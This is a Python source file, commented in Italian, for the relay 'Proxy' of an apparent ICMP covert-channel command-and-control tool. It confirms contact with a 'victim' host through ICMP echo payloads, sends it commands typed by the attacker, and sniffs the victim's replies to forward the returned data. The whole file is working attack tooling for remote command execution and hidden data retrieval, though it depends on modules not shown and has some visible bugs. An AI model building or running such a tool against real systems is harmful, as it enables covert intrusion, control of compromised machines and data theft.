#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import ipaddress
import sys 
import os 
import argparse  
import threading 
import json 
import socket 

from mymethods import *  
from scapy.all import * 
from network import *

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import * 
from attacksingleton import _IPx 
from check_type import * 
from custom_enum import SENDER_TRUE_SENDER 
from get_type import *



def update_data_received(data, data_lock:threading.Lock, data_received):
    data_lock.acquire()
    data_received.append(data)
    data_lock.release() 

DEBUG=False  
proxy_port=4567 
default_file_path:str = "./attack_file.json" 
type_sender=SENDER_TRUE_SENDER 
use_delay=False 
timeout_time=20
#-------------------------------- 
class GET_ARGS:  
    def from_parser(oggetto=None): 
        if isinstance(oggetto,Proxy): 
            print("_proxy_get_args_from_parser") 
            parser = argparse.ArgumentParser()
            parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
            #parser.add_argument("--provaFlag",type=str, help="Comando da eseguire")
            try:
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                return args if GET_ARGS.check_value_in_parser(oggetto, args) else None
            except Exception as e: 
                print(e)
                PARSER.print_supported_arguments(parser) 
        #elif isinstance(oggetto,Proxy): 
        #    print("Proxy") 
        #elif isinstance(oggetto,Victim): 
        #    print("Proxy") 
        return None
    
    def check_value_in_parser(oggetto, args): 
        if not isinstance(args,argparse.Namespace): 
            print(f"args non vlaido")  
        if isinstance(oggetto,Proxy):  
            if not args.ip_attaccante or not is_string(args.ip_attaccante): 
                print(f"--ip_attaccante non specificato") 
            else: return True  
        return False

class THREAD_VAR: 
    lock:threading.Lock=None
    response:bool=False 
    thread:threading.Thread=None 
    
    def __init__(self, callback_function=None, args:list=None):  
        if not is_callable_function(callback_function): 
            raise TypeError("callback_function non valido") 
        if args and not is_list(args): 
            raise TypeError("args non valido") 
        self.lock=get_threading_Lock()  
        self.response=False  
        if args is None: 
            self.thread=threading.Thread(target=callback_function)  
        else: 
            self.thread=threading.Thread(
                target=callback_function, 
                args=args
            )   
    
    def start(self): 
        if not is_threading_Thread(self.thread): 
            raise TypeError("thread non valido") 
        #print("FUNCTION", self.thread.target) 
        #self.thread.clear()
        self.thread.start() 
    def restart(self, callback_function=None, args:list=None): 
        if not is_callable_function(callback_function): 
            raise TypeError("callback_function non valido") 
        if args and not is_list(args): 
            raise TypeError("args non valido") 
        if args is None: 
            self.thread=threading.Thread(target=callback_function)  
        else: 
            self.thread=threading.Thread(
                target=callback_function, 
                args=args
            )  
    def wait(self): 
        if not is_threading_Thread(self.thread): 
            raise TypeError("thread non valido") 
        print("THREAD_VAR: Aspetto che il thread termini")
        self.thread.join() 
    
    def acquire_lock(self): 
        self.lock.acquire() 
    def release_lock(self): 
        self.lock.release() 
    
    def update_response(self, response:bool=False): 
        if not is_boolean(response): 
            raise TypeError("response non boolean")
        if not is_threading_Lock(self.lock): 
            raise TypeError("lock non valido")    
        self.acquire_lock()
        self.response=response
        self.release_lock() 
        print("RISPOSTA AGGIORNATA")

attacker_mode=True
class Proxy: 
    ip_attaccante:ipaddress._IPAddressBase=None 
    ip_host:ipaddress._IPAddressBase=None 
    ip_vittima=None 
    attack_function:AttackType=None 
    data_received:list=None

    socket_attacker:socket=None #tuple[socket, _RetAddress]
    thread_data:THREAD_VAR=None 
    stop_flag={"value":False} 

    def __init__(self): 
        def get_ip_host(): 
            ip_host, errore=IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                try: 
                    ip_host=ipaddress.ip_address(input(msg)) 
                except Exception as e: 
                    print(e) 
                    return None
            try: 
                #TODO eliminare alla fine
                #self.ip_host=ipaddress.ip_address("192.168.56.104") 
                ip_host=ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None
            print(f"ip_host: {type(ip_host)} {ip_host}") 
            return ip_host
        #--------------------------
        self.data_received=[]
        while not is_ipaddress(self.ip_host): 
            self.ip_host=get_ip_host() 
        print(f"IP HOST",self.ip_host) 
        #GET-ARGS
        args=GET_ARGS.from_parser(self) 
        if not is_namespace(args): 
            exit(-1) 
        try:  
            if attacker_mode and args.ip_attaccante=="self": 
                self.ip_attaccante=self.ip_host 
            else: self.ip_attaccante=ipaddress.ip_address(args.ip_attaccante) 
        except ValueError as v: 
            print(v)
            exit(-1) 
        print(f"IP ATTACCANTE: {self.ip_attaccante}") 
    
    def start(self): 
        def update_attaccante(result:bool): 
            #AGGIORNO ATTACCANTE SU CONNESISONE CON VITTIMA
            if attacker_mode: 
                print("ATACKER_MODE->update_attaccante")
                return
            if not is_boolean(result): 
                raise TypeError("result non booleano") 
            if not is_ipaddress(self.ip_vittima): 
                raise TypeError("ip_vittima non valido") 
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido") 
            if not isinstance(self.socket_attacker,socket): 
                if attacker_mode: 
                    print("ATTACKER MODE -> socket_attacker")
                else: raise TypeError("socket_attacker non valido") 
            data=(
                MSG.CONFIRM_VICTIM.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed+
                str(result) 
            )  
            if attacker_mode: 
                print("ATTACKER MODE -> SendSingleton")
                SendSingleton(
                    AttackType.ipv4_echo_payload, 
                    SENDER_TRUE_SENDER, 
                    False 
                ).send_data(data.encode(), self.ip_host) 
            else: self.socket_attacker.sendall(data.encode())  
            print(f"Aggiornamento confermato all'attaccante")
            if not result:
                self.socket_attacker.close()
                raise SystemError("NON CONNESSO ALLA VITITMA",self.ip_vittima) 
            print("CONNESSO A",self.ip_vittima)  
        #---------------------------
        #FIREWALL.disable()  
        try: 
            self.connessione_attaccante() 
        except Exception as e: 
            print(e)
            exit(-1) 
        try: 
            self.connessione_vittima() 
            print("Aggiorno attaccante...")
            update_attaccante(self.thread_data.response)  
            if not self.thread_data.response: 
                print("NESSUNA CONNESSIONE CON:",self.ip_vittima) 
                exit(0)
        except Exception as e: 
            print(e)
            exit(-1) 
        try: 
            self.comando_from_attaccante() 
        except Exception as e: 
            print(e)
            exit(-1) 
        #FIREWALL.enable() 
    
    def connessione_attaccante(self): 
        def setup_server(): 
            if not is_ipaddress(self.ip_attaccante): 
                raise TypeError("ip_attaccante non valido") 
            while True: 
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    print(f"Server listening: {s}")  
                    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
                    s.bind(
                        (self.ip_host.compressed, proxy_port)
                        #("192.168.56.104", 4567) 
                        #(socket.gethostname(), 4567)
                    ) 
                    s.listen(1) 
                    accepted_socket,accepted_addr=s.accept() 
                    try: 
                        accepted_addr=ipaddress.ip_address(accepted_addr)
                        if accepted_addr.compressed!=self.ip_attaccante.compressed: 
                            raise ValueError("NON E L'ATTACCANTE", accepted_addr)
                    except ValueError|Exception as v: 
                        accepted_socket.close() 
                print("SOCKET",accepted_socket)
                return accepted_socket
        def IF_attacker_mode(): 
            config_file=None 
            if not os.path.exists(default_file_path) or not str(default_file_path).endswith(".json"):
                print(f"Il file {default_file_path} non esistono") 
                exit(-1)
            with open(default_file_path, 'r') as file: 
                print(f"File di configurazione {default_file_path} caricato correttamente") 
                config_file= json.load(file) 
            self.attack_function=AttackType.get_attack_method(config_file.get("attack_function"))
            if not is_enum_member(self.attack_function,AttackType): 
                self.attack_function=AttackType.choose_attack_function() 
            print(f"ATTACCO:",self.attack_function) 
            self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))   
            if not is_ipaddress(self.ip_vittima):
                raise TypeError("ip_vittima non valido") 
            print(f"IP VITTIMA",self.ip_vittima) 
        #--------------------------------
        #with self.socket_attacker: 
        #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6 
        if attacker_mode: 
            return IF_attacker_mode() 
        self.socket_attacker=setup_server()
        data_received=self.socket_attacker.recv(1024).decode() 
        if not is_string(data_received) or MSG.CONFIRM_ATTACKER.value not in data_received:
            print(f"Invalid data from {self.socket_attacker[0]}: {data_received}") 
            self.socket_attacker.close()  
            exit(-1) 
        data_received=data_received.split("||")
        #print("Dati ricevuti: ", data_received) 
        for data in data_received:
            if MSG.CONFIRM_ATTACKER.value in data:
                extracted_ip=data.replace(MSG.CONFIRM_ATTACKER.value,"")
                self.ip_vittima=ipaddress.ip_address(extracted_ip)
                print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
            elif MSG.ATTACK_FUNCTION.value in data: 
                extracted_function=data.replace(MSG.ATTACK_FUNCTION.value,"").strip()
                self.attack_function=AttackType.get_attack_method(extracted_function)
                print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
            else: print("UNKNOWN DATA",data) 
        if not is_ipaddress(self.ip_vittima): 
            raise TypeError("non ipaddress",self.ip_vittima)  
        if not is_enum_member(self.attack_function,AttackType): 
            raise TypeError("non AttackType",self.attack_function)  
        data=(MSG.CONFIRM_PROXY.value+
              self.ip_vittima.compressed+
              self.ip_host.compressed
            )
        self.socket_attacker.sendall(data.encode()) 
        print("Socket con attaccante stabilito") 
    
    def connessione_vittima(self): 
        def wait_conn_from_victim(oggetto=None): 
            def get_filter(): 
                #checksum=CALC.checksum(confirm_text.strip().encode()) 
                IPv4_ECHO_REQU=8 
                IPv4_ECHO_REP=0 
                if oggetto.ip_vittima.version==4: 
                    icmp="icmp " 
                elif oggetto.ip_vittima.version==6: 
                    icmp="icmp6 "  
                if DEBUG: 
                    filter=f"({icmp} or tcp) "
                    #filter+=f" and src {oggetto.ip_vittima.compressed} "
                    filter+=f" and dst {oggetto.ip_host.compressed}"
                    print("FILTER",filter)
                    return filter
                else: 
                    filter=icmp 
                    filter+=f" and (icmp[0]=={IPv4_ECHO_REQU} or icmp[0]=={IPv4_ECHO_REP}) " 
                    filter+=f" and src {oggetto.ip_vittima.compressed} "
                    filter+=f" and dst {oggetto.ip_host.compressed}"
                #filter+=f"and icmp[4:2]={checksum} "
                print("FILTER",filter)
                return filter 
            def callback_connessione(packet):  
                #print(packet.summary()) 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                    #and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                    if not oggetto.ip_vittima.compressed==packet[IP].src: 
                        return 
                    confirm_text=(
                        MSG.CONFIRM_VICTIM.value+
                        oggetto.ip_vittima.compressed+
                        oggetto.ip_host.compressed
                    )
                    check_sum=CALC.checksum(confirm_text.encode()) 
                    if confirm_text in packet[Raw].load.decode(): 
                        print("CONNESSIONE VITTIMA CONFERMATA") 
                        oggetto.thread_data.update_response(True) 
                        oggetto.stop_flag["value"]=True 
                        THREADING_EVENT.set(event_pktconn) 
                        return        
            def _old_get_callback(event_pktconn:threading.Event): 
                #print("MONITORO IL TRAFFICO PER CONFERME DALLA VITTIMA")
                def callback(packet): 
                    print(packet.summary()) 
                    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
                        if not oggetto.ip_vittima.compressed==packet[IP].src: 
                            return
                        confirm_text=(
                            MSG.CONFIRM_VICTIM.value+
                            oggetto.ip_vittima.compressed+
                            oggetto.ip_host.compressed
                        )
                        check_sum=CALC.checksum(confirm_text.encode()) 
                        if confirm_text in packet[Raw].load.decode(): 
                            print("CONNESSIONE VITTIMA CONFERMATA") 
                            THREADING_EVENT.set(event_pktconn) 
                            return 
                return callback 
            def stop_filter(pkt): 
                return oggetto.stop_flag["value"]  
            def timeout_timer(): 
                print("TIMEOUT TIMER") 
                oggetto.stop_flag["value"]=True 
                oggetto.thread_data.update_response(False) 
                THREADING_EVENT.set(event_pktconn) 
            def _old_sniff(): 
                timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
                timer.start() 
                confirm_text=(
                    MSG.CONFIRM_VICTIM.value+
                    oggetto.ip_vittima.compressed+
                    oggetto.ip_host.compressed
                )  
                sniff( 
                    filter=get_filter(confirm_text)
                    ,prn=get_callback()
                    ,store=False 
                    ,stop_filter=stop_filter 
                ) 
                #--------------------------
            #--------------------------------
            if not isinstance(oggetto, Proxy): 
                raise TypeError("oggetto non è Proxy",type(oggetto)) 
            if not is_ipaddress(oggetto.ip_vittima): 
                raise TypeError("ip_vittima non valido") 
            if not is_ipaddress(oggetto.ip_host): 
                raise TypeError("ip_host non valido") 
            if not isinstance(oggetto.thread_data,THREAD_VAR): 
                raise TypeError("oggetto non è THREAD_VAR",type(oggetto.thread_data)) 
            if not is_threading_Lock(oggetto.thread_data.lock): 
                raise TypeError("lock non valido") 
            if not is_boolean(oggetto.thread_data.response): 
                raise TypeError("response non valida") 
            
            print("START wait_conn_from_victim")
            event_pktconn=get_threading_Event() 
            if not is_threading_Event(event_pktconn): 
                raise TypeError("event_pktconn is not threading.Event",type(event_pktconn)) 
            timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer())  
            if not is_threading_Timer(timer): 
                raise TypeError("timer is not threading.Timer",type(timer))  
            interface=INTERFACE_FROM_IP(oggetto.ip_vittima).interface 
            if interface is None: 
                raise ValueError("interface is None",interface) 
            print("INTERFACE",interface) 
            sniff_args={
                "filter":get_filter()
                #,"count":1 
                ,"prn":callback_connessione
                #,"store":True 
                ,"iface":interface
            } 
            sniffer:AsyncSniffer=get_AsyncSniffer(sniff_args) 
            if not is_AsyncSniffer(sniffer): 
                raise TypeError("sniffer is AsyncSniffer",type(sniffer)) 
            sniffer.start()
            if sniffer.running: 
                print("Sniffer started...") 
            else: raise RuntimeError("SNIFFER NOT STARTED") 
            timer.start() 
            if timer.is_alive(): 
                print("Timer started...") 
            print("Waiting thread to end...")
            THREADING_EVENT.wait(event_pktconn) 
            if timer.is_alive(): 
                timer.cancel()
                print("Timer stopped...") 
            sniffer.stop()
            if sniffer.running: 
                raise RuntimeError("SNIFFER NOT STOPPED",sniffer.running)
            print("Sniffer stopped...") 
        #------------------------
        print("START connessione_vittima")
        self.thread_data=THREAD_VAR( 
            lambda: wait_conn_from_victim(self) 
        ) 
        self.thread_data.start() 
        if not is_enum_member(self.attack_function,AttackType): 
            raise TypeError("attack_function non valida")  
        #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
        #int_code=self.attack_function.value  
        #XORversion= ord("i") ^ int(int_version) 
        #XORcode= ord("p") ^ int(int_code)  
        #icmp_id=(XORversion<<8)+XORcode  
        confirm_text=(
            MSG.CONFIRM_PROXY.value+
            self.ip_vittima.compressed+
            self.attack_function.name
        )  
        SendSingleton(
            AttackType.ipv4_echo_payload, 
            SENDER_TRUE_SENDER, 
            False 
        ).send_data(confirm_text.encode(), self.ip_vittima) 
        print("Confirm sent to victim...")
        self.thread_data.wait()  
        print("Thread has been executed...")
        self.thread_data.acquire_lock()  
        response=self.thread_data.response
        self.thread_data.release_lock() 
        if response: 
            print("Received confirm from victim...")
        else: raise RuntimeError("CONFERMA DALLA VITITMA NON ARRIVATA") 
        print("END connessione_vittima")
        
    def comando_from_attaccante(self): 
        def IF_attacker_mode(): 
            msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
            command=input(msg)  
            return MSG.CONFIRM_COMMAND.value+command 
        def end_communication_wth_victim():
            if not is_ipaddress(self.ip_vittima):
                raise Exception(f"ip_vittima non validi ipaddress") 
            data=MSG.END_COMMUNICATION.value
            #SNIFFER.send_packet(data.encode(),ip_dst=ip_vittima) 
            SendSingleton(
                self.attack_function, 
                type_sender, 
                use_delay 
            ).send_data(data.encode(), self.ip_vittima) 
            print("VITTIMA AGGIORNATA") 
        def inoltra_dati(): 
            if not is_list(self.data_received):
                raise Exception(f"Argomenti non validi: {type(self.data_received)}") 
            print(f"DATI RICEVUTI",self.data_received) 
            for data in self.data_received:
                print("INOLTRO",data) 
                if attacker_mode: 
                    continue
                try: 
                    if not is_bytes(data): 
                        data=bytes(data) 
                except Exception as e: 
                    print("Conversione non riuscita",e) 
                    continue
                try: 
                    self.socket_attacker.sendall(data) 
                except Exception as e:
                    print("Invio dati non riuscito",e) 
            print("INVIO LAST_PACKET")
            if attacker_mode: 
                pass
            else: self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode())
            print("DATI INOLTRATI") 
        #---------------------------
        if not is_socket(self.socket_attacker): 
            if attacker_mode: 
                print("ATACKER_MODE->connessione_vittima\tsocket_attacker")
            else: raise TypeError("socket non valido",self.socket_attacker)
        if not is_ipaddress(self.ip_vittima): 
            raise TypeError("ip_vittima non ipaddress") 
        if not is_ipaddress(self.ip_host): 
            raise TypeError("ip_host non ipaddress")  
        if not is_enum_member(self.attack_function,AttackType): 
            raise TypeError("attack_function non AttackType") 
        if not is_list(self.data_received): 
            raise TypeError("data_received non lista")  
        
        wait_class=ReceiveSingleton(self.attack_function).wait_class
        if not isinstance(wait_class, _IPx):  
            raise TypeError("wait_class non _IPx",type(wait_class)) 
        print("WAIT CLASS",type(wait_class)) 
        while True: 
            if attacker_mode: 
                socket_data=IF_attacker_mode() 
            else: socket_data=self.socket_attacker.recv(1024).decode()  
            print("RECEIVED COMMAND", socket_data) 
            if not is_string(socket_data): 
                print("socket_data not string",type(socket_data) )
                break 
            if any(case in socket_data for case in exit_cases): 
                print("socket_data in exit_cases",socket_data)
                break 
            if MSG.END_COMMUNICATION.value in socket_data: 
                print("END_COMMUNICATION in socket_data",socket_data)
                break  
            thread_data=threading.Thread(target= lambda: wait_class.wait() ) 
            thread_data.start() 
            #data=wait_class.wait().data
            print(f"Tramite {self.attack_function.name} aspetto che {self.ip_vittima} mandi i dati") 
            #if comando is not None:
            #   data=CONFIRM_COMMAND+comando 
            if MSG.CONFIRM_COMMAND.value in socket_data:   
                command= socket_data.replace(MSG.CONFIRM_COMMAND.value,"").strip()
                print("COMANDO",command) 
                SendSingleton(
                    self.attack_function, 
                    type_sender, 
                    use_delay 
                ).send_data(command.encode(), self.ip_vittima) 
            elif MSG.WAIT_DATA.value in command:
                print("ASPETTO I DATI")
            else: print(f"COMMAND: caso non contemplato {command}")
            if thread_data.ident is not None:
                thread_data.join() 
            self.data_received=[]  
            self.data_received=wait_class.data 
            print("DATA RECEIVED:",self.data_received)
            if not is_list(self.data_received) or len(self.data_received)<=0:
                print("NESSUN DATO") 
                if attacker_mode: 
                    print("ATTACKER MODE -> sending to attacker LAST PACKET")
                else: self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) 
            else:
                inoltra_dati() 
            socket_data=None
        print("INTERRUZIONE PROGRAMMA") 
        end_communication_wth_victim() 
        if attacker_mode: 
            pass
        else: self.socket_attacker.close()  
        
if __name__=="__main__":  
    proxy=Proxy() 
    proxy.start()